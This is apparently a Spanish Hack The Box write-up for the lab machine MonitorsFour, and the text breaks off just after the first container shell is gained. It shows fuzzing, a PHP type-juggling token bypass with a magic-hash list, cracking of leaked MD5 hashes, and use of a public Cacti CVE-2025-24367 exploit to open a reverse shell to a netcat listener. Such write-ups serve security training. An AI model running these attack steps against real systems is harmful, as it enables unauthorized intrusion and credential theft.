---
title: "MonitorsFour - Hack The Box"
date: 2025-12-12
draft: false
slug: "htb-writeup-monitorsFour"
excerpt: "Esta fue una máquina algo complicada. Después de analizar los escaneos, nos dirigimos directamente a la página web activa del puerto 80, siendo ahí donde descubrimos un login y el uso de PHP versión 8.3.27, pero al no encontrar nada más, decidimos aplicar Fuzzing. Aplicando Fuzzing, descubrimos un subdominio que es un login y utiliza la herramienta Cacti Network Management, también descubrimos algunos archivos dentro del dominio principal, siendo uno de estos un endpoint que resulta ser una API, al cual también descubrimos un parámetro aplicando Fuzzing. Resulta que el parámetro utiliza PHP Type Juggling, por lo que utilizamos Magic Hashes para aplicar un bypass al parámetro que encontramos, siendo así que logramos obtener toda la información de la API. En esa información, vemos usuarios y sus contraseñas en Hashes MD5, pero al intentar crackearlas, solo obtenemos un resultado exitoso, siendo un usuario y contraseña que nos sirven para ganar acceso al login de Cacti. Investigamos la versión usada de Cacti, viendo que es vulnerable al CVE-2025-24367, lo que nos permite ganar acceso principal a la máquina víctima. Dentro, identificamos que estamos dentro de un contenedor de Docker y a su vez, descubrimos una segunda interfaz que resulta ser una API Docker que es vulnerable al CVE-2025-9074, lo que nos permite crear una montura del directorio del Root, siendo así que logramos escalar privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Docker", "API Docker", "Web Enumeration", "Fuzzing", "Information Leakage", "Subdomain Fuzzing", "Cacti Network Management", "Parameter Fuzzing", "PHP Type Juggling", "Magic Hashes Bypass", "API Broken Authentication", "Cracking Hash", "Cracking MD5 Hash", "Cacti Authenticated Graph Template RCE", "CVE-2025-24367", "Privesc - Docker Remote API Escape", "Privesc - CVE-2025-9074", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "curl"
  - "cat"
  - "ChatGPT"
  - "jq"
  - "crackstation"
  - "JohnTheRipper"
  - "wget"
  - "nc"
  - "Python3"
  - "sudo"
  - "id"
  - "ip"
  - "chisel"
  - "proxychains"
links:
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md"
  - "https://medium.com/@Q2hpY2tlblB3bnk/php-type-juggling-c34a10630b10"
  - "https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html"
  - "https://crackstation.net/"
  - "https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC"
  - "https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf"
  - "https://github.com/jpillora/chisel"
  - "https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape"
  - "https://github.com/j3r1ch0123/CVE-2025-9074?tab=readme-ov-file"
  - "https://blog.qwertysecurity.com/Articles/blog3.html"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-monitorsFour/monitorsFour.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.98
PING 10.10.11.98 (10.10.11.98) 56(84) bytes of data.
64 bytes from 10.10.11.98: icmp_seq=1 ttl=127 time=79.8 ms
64 bytes from 10.10.11.98: icmp_seq=2 ttl=127 time=70.5 ms
64 bytes from 10.10.11.98: icmp_seq=3 ttl=127 time=75.3 ms
64 bytes from 10.10.11.98: icmp_seq=4 ttl=127 time=75.0 ms

--- 10.10.11.98 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3064ms
rtt min/avg/max/mdev = 70.526/75.162/79.810/3.284 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.98 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 01:42 CST
Initiating SYN Stealth Scan at 01:42
Scanning 10.10.11.98 [65535 ports]
Discovered open port 80/tcp on 10.10.11.98
Discovered open port 5985/tcp on 10.10.11.98
Completed SYN Stealth Scan at 01:43, 26.80s elapsed (65535 total ports)
Nmap scan report for 10.10.11.98
Host is up, received user-set (0.21s latency).
Scanned at 2025-12-14 01:42:38 CST for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
5985/tcp open  wsman   syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (984B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente obtuvimos dos puertos abiertos, así que supongo que la intrusión será por la página web del **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,5985 10.10.11.98 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 01:44 CST
Nmap scan report for 10.10.11.98
Host is up (0.071s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx

|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos está indicando que cuando entremos a la página web, nos va a redirigir a un dominio.

Registremos ese dominio en el `/etc/hosts`:
```bash
echo "10.10.11.98 monitorsfour.htb" >> /etc/hosts
```
No tenemos otra información, así que vayamos a analizar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura1.png">
</p>

Parece ser una página web dedicada a la implementación de redes empresariales.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura2.png">
</p>

Podemos destacar el uso de **Nginx** y de **PHP**.

En la página principal, vemos que es posible loguearnos:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura3.png">
</p>

Pero como no tenemos credenciales válidas, tendremos que buscar otra forma de ganar acceso.

De momento no hay más que podamos hacer, así que apliquemos **Fuzzing** para buscar archivos o directorios ocultos.

### Fuzzing {#fuzz}

Aplicaremos **Fuzzing** intensivo para descubrir varias cosas del dominio.

#### Aplicando Fuzzing a la Página Web para Descubrir Archivos o Directorios Ocultos {#fuzz2}

Primero probemos con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://monitorsfour.htb/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.env                    [Status: 200, Size: 97, Words: 1, Lines: 6, Duration: 132ms]
.htpasswd               [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 146ms]
.git/logs/.html         [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 150ms]
.htaccess.txt           [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 152ms]
.htaccess.html          [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 152ms]
.hta                    [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 258ms]
.hta.txt                [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 342ms]
.htpasswd.txt           [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 341ms]
.hta.html               [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 351ms]
.htaccess               [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 395ms]
.htpasswd.html          [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 420ms]
cgi-bin/.html           [Status: 403, Size: 146, Words: 3, Lines: 8, Duration: 92ms]
contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 1256ms]
controllers             [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 233ms]
forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 1528ms]
login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 1794ms]
static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 90ms]
views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 127ms]
user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 1895ms]
:: Progress: [18984/18984] :: Job [1/1] :: 247 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 300 -x php,txt,html --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 146]
/.htaccess.html       (Status: 403) [Size: 146]
/.htpasswd.txt        (Status: 403) [Size: 146]
/.htaccess            (Status: 403) [Size: 146]
/.htaccess.txt        (Status: 403) [Size: 146]
/.htpasswd.html       (Status: 403) [Size: 146]
/.hta.html            (Status: 403) [Size: 146]
/.hta.txt             (Status: 403) [Size: 146]
/.hta                 (Status: 403) [Size: 146]
/.git/logs/.html      (Status: 403) [Size: 146]
/.env                 (Status: 200) [Size: 97]
/cgi-bin/.html        (Status: 403) [Size: 146]
/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
/contact              (Status: 200) [Size: 367]
/forgot-password      (Status: 200) [Size: 3099]
/login                (Status: 200) [Size: 4340]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
/user                 (Status: 200) [Size: 35]
Progress: 18984 / 18984 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar una busqueda de archivos específicos. |
| *--ne*     | Para que no muestre errores. |

En ambos casos obtuvimos bastantes resultados, pero los que más llaman la atención son el archivo **.env** y la página `/user`.

Observa lo que pasa si tratamos de ver el contenido del archivo **.env**:
```bash
curl -s http://monitorsfour.htb/.env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
Vemos las credenciales de acceso del servicio **MariaDB**.

Ahora, veamos la página `/user`:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura4.png">
</p>

Parece que necesitamos encontrar el parámetro de esta página, pero antes de seguir avanzando, veamos si existe algún subdominio.

#### Aplicando Fuzzing para Identificar Subdominios {#fuzz3}

Para esto, primero usaremos la herramienta **ffuf** y el wordlist `/seclists/Discovery/DNS/subdomains-top1million-5000.txt`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://monitorsfour.htb/FUZZ -H "Host: FUZZ.monitorsfour.htb" -t 300 -fs 138

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 138
________________________________________________

cacti                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 282ms]
:: Progress: [4989/4989] :: Job [1/1] :: 417 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-H*       | Para indicar el uso de una cabecera HTTP específica. |
| *-fs*      | Para aplicar un filtro que solo muestre resultados de un tamaño especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster dns --do monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 300 --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     monitorsfour.htb
[+] Threads:    300
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
cacti.monitorsfour.htb ::ffff:10.10.11.98
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *--do*       | Para indiccar un dominio a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--ne*     | Para que no muestre errores. |

Encontramos un subdominio.

Regístralo en el `/etc/hosts` y luego visítalo:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura5.png">
</p>

Parece que encontramos otro login y está utilizando una herramienta llamada **cacti**.

Antes de seguir investigando, tratemos de obtener el parámetro que hace falta en la página `/user`.

#### Aplicando Fuzzing a Página user para Encontrar Parámetro Oculto {#fuzz4}

Primero usaremos la herramienta **ffuf** y usaremos el wordlist `/seclists/Discovery/Web-Content/burp-parameter-names.txt`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://monitorsfour.htb/user?FUZZ=test' -t 300 -fs 35

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 35
________________________________________________

token                   [Status: 200, Size: 36, Words: 4, Lines: 1, Duration: 2557ms]
:: Progress: [6453/6453] :: Job [1/1] :: 105 req/sec :: Duration: [0:00:56] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-fs*      | Para aplicar un filtro que solo muestre resultados de un tamaño especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster fuzz -u 'http://monitorsfour.htb/user?FUZZ=test' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 300 --xl 35 --ne
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://monitorsfour.htb/user?FUZZ=test
[+] Method:           GET
[+] Threads:          300
[+] Wordlist:         /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   35
[+] User Agent:       gobuster/3.8
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=36] [Word=token] http://monitorsfour.htb/user?token=test
Progress: 6453 / 6453 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--xl*     | Para aplicar un filtro que solo muestre resultados de n tamaño. |
| *--ne*     | Para que no muestre errores. |

Excelente, identificamos el parámetro que se necesita usar para que la página funcione.

Pero observa lo que pasa cuando lo probamos:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura6.png">
</p>

Necesitamos encontrar un token válido para poder ver información.

También descubrimos que este endpoint `/user` es una **API** que, suponiendo que tengamos el token correcto, podríamos ver información de los usuarios registrados.

Con todo lo que hemos descubierto, haremos lo siguiente:
* Identificar un token válido para el endpoint `/user`.
* Ganar acceso al login del subdominio **cacti**.
* Ganar acceso al login del dominio **monitorsfour**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Bypass a PHP Type Juggling con Magic Hashes para Ver Contenido de API user (API Broken Authentication) y Crackeando Hash MD5 {#TypeJuggling}

Investigando cómo es posible el funcionamiento de este parámetro y viendo el uso de **PHP Ver. 8.3.27**, vemos que se está aplicando **PHP Type Juggling**.

¿Qué es **PHP Type Juggling**?

| **PHP Type Juggling** |
|:---------------------:|
| *Type juggling en PHP es un comportamiento del lenguaje (no una vulnerabilidad por sí solo) que ocurre cuando PHP convierte automáticamente tipos de datos al hacer comparaciones u operaciones. El problema aparece cuando esa conversión se usa mal en validaciones, y ahí sí se convierte en una vulnerabilidad explotable.* |

Aquí tienes un repositorio que explica las vulnerabilidades que se pueden aplicar en **PHP Type Juggling**:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md" target="_blank">Repositorio de payloadallthethings: Type Juggling</a>

En este repositorio se nos explica que, a partir de la **versión 8 de PHP**, se utiliza **comparación aproximada (loose comparison)** en lugar de **comparación estricta (stric comparison)**.

Pero, si un usuario tiene control de las variables que utilizan esto, podemos aprovechar una implementación débil para obtener resultados positivos cuando no deberíamos obtenerlos.

Para esto, utilizaremos **Magic Hashes**:

| **Magic Hashes** |
|:----------------:|
| *Los magic hashes son un caso especial de type juggling en PHP que permite bypassear comparaciones de hashes cuando la aplicación usa comparación débil (==) en lugar de comparación estricta. Un magic hash es un hash que empieza con 0e seguido solo de números, y que PHP interpreta como un número en notación científica.* |

Le pedí a **ChatGPT** que generara un wordlist de **Magic Hashes**, así que te lo comparto:
```bash
cat php_magic_hashes.txt
240610708
QNKCDZO
aabg7XSs
aabC9RqS
s878926199a
s155964671a
s214587387a
s1091221200a
s1885207154a
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
0
00
000
0e0
0e1
0e1337
0e12345
0e123456789
0e987654321
0e999999
0e999999999
true
false
True
False
TRUE
FALSE
1abc
1e1
1e10
01
001
```

Probemos este wordlist con **ffuf** para probar si alguno funciona:
```bash
ffuf -w php_type_juggling_hashes.txt:FUZZ -u 'http://monitorsfour.htb/user?token=FUZZ' -t 300 -fs 36

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?token=FUZZ
 :: Wordlist         : FUZZ: /home/berserkwings/Escritorio/HackTheBox/Season9/MonitorsFour/content/php_type_juggling_hashes.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 36
________________________________________________

0e999999                [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 105ms]
0e987654321             [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 110ms]
0e1337                  [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 105ms]
000                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 107ms]
0e12345                 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 101ms]
0e1                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 103ms]
0e999999999             [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 136ms]
0e0                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 137ms]
0e123456789             [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 137ms]
0                       [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 137ms]
00                      [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 138ms]
:: Progress: [35/35] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
Excelente, parece que funcionaron varios de estos.

Probemos alguno desde el navegador o puedes hacer una **petición GET** con **curl**:
```bash
curl -s "http://monitorsfour.htb/user?token=0" | jq
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```
Genial, podemos ver el contenido del endpoint `/user` y son los datos de usuarios registrados.

Parece que sus contraseñas están convertidas en **Hash MD5**.

Guardemos los **Hashes MD5** en un archivo de texto:
```bash
curl -s "http://monitorsfour.htb/user?token=0" | jq -r '.[].password' > hashes.txt
```

### Crackeando Hash MD5 y Ganando Acceso a Login de Cacti Network Management {#Cracking}

Para crackearlos, usaremos la página web **crackstation**:
* <a href="https://crackstation.net/" target="_blank">Crackstation</a>

Cópialos y pégalos en la página:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura7.png">
</p>

También puede hacerlo con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (?)     
1g 0:00:00:00 DONE (2025-12-14 21:21) 1.162g/s 16678Kp/s 16678Kc/s 50054KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Muy bien, tenemos la contraseña solo del **usuario admin**.

Con este usuario y contraseña, podemos ganar acceso al login del dominio **monitourfour.htb**:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura8.png">
</p>

Caso contrario con el login de **cacti**, pero ganamos acceso si usamos el nombre asociado a este usuario, que sería **marcus**:

<p align="center">
<img src="/assets/images/htb-writeup-monitorsFour/Captura9.png">
</p>

Busquemos una forma de explotar estos dos accesos que tenemos.

### Probando Exploit: CVE-2025-24367 - Cacti Authenticated Graph Template RCE {#cactiExploit}

Durante la investigación del dominio y del uso de la herramienta **cacti**, vemos que existe una vulnerabilidad reciente para la versión usada de **cacti**.

Pero, veamos de qué trata esta herramienta:

| **Cacti Network Management** |
|:----------------------------:|
| *Cacti es una herramienta de Network Management / Network Monitoring de código abierto, muy usada para monitorear el rendimiento de redes y sistemas mediante gráficas históricas. Cacti permite recopilar métricas (tráfico, CPU, memoria, disco, etc.) y mostrarlas en gráficas a lo largo del tiempo, principalmente usando SNMP y RRDTool.* |

La vulnerabilidad reciente **CVE-2025-24367** permite inyectar comandos si tenemos un usuario válido, lo que nos puede permitir inyectar y ejecutar una **Reverse Shell**.

Curiosamente, uno de los autores que creó esta máquina, creó un script de **Python** que explota esta vulnerabilidad y ejecuta una **Reverse Shell**:
* <a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC" target="_blank">Repositorio de TheCyberGeek: CVE-2025-24367-Cacti-PoC</a>

Podemos descargarlo con **wget**:
```bash
wget https://raw.githubusercontent.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/refs/heads/main/exploit.py
```

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

En el repositorio se nos indica que tenemos que darle las credenciales de acceso, la url del dominio vulnerable, nuestra IP y un puerto a usar.

Probémoslo:
```bash
python3 exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i Tu_IP -l 443
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: NTaDI.php
[+] Got payload: /bash
[i] Created PHP filename: CJ6yg.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.98] 50105
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ whoami
whoami
www-data
```
Estamos dentro.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

Si revisamos el directorio `/home`, veremos que podemos entrar al directorio del **usuario marcus**:
```bash
www-data@821fbd6a43fa:~/html/cacti$ ls -la /home/
total 16
drwxr-xr-x 1 root   root   4096 Nov 10 16:15 .
drwxr-xr-x 1 root   root   4096 Dec 15 03:51 ..
drwxr-xr-x 1 marcus marcus 4096 Dec 14 18:52 marcus
```

Entramos ahí y obtendremos la flag del usuario:
```bash
www-data@821fbd6a43fa:~/html/cacti$ cd /home/marcus/
www-data@821fbd6a43fa:/home/marcus$ ls
user.txt
www-data@821fbd6a43fa:/home/marcus$ cat user.txt
...
```

## Post Explotación {#Post}

### Probando Exploit: CVE-2025-9074 - Docker Remote API Escape {#DockerAPI}

Veamos si nuestro usuario tiene privilegios:
```bash
www-data@821fbd6a43fa:/home/marcus$ sudo -l
bash: sudo: command not found
```
No tiene ninguno; de hecho, no tenemos el comando **sudo** disponible porque, si te das cuenta, estamos dentro de un contenedor de **Docker**.

Esto lo sabemos por cómo se ve el **prompt** y por la falta de varios comandos.

Veamos a qué grupos pertenece nuestro usuario:
```bash
www-data@821fbd6a43fa:/home/marcus$ id
